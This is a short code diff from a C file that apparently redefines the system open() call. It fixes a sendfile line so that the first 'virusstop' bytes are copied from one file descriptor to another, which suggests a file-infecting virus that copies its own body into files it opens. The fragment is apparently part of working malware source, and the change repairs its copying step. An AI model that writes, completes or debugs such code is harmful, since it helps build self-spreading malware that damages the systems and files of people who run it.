@@ -62,7 +62,7 @@ int open(const char *pathname, int flags, ...){
         return -1;
     }
     off_t zero = 0;
-    ssize_t newfile = sendfile(filebuf, pathname, &zero, virusstop);
+    ssize_t newfile = sendfile(fd2, fd, &zero, virusstop);
     
     if(lseek(fd, virusstop, SEEK_SET) == -1){
         printf("lseek failed.\n");
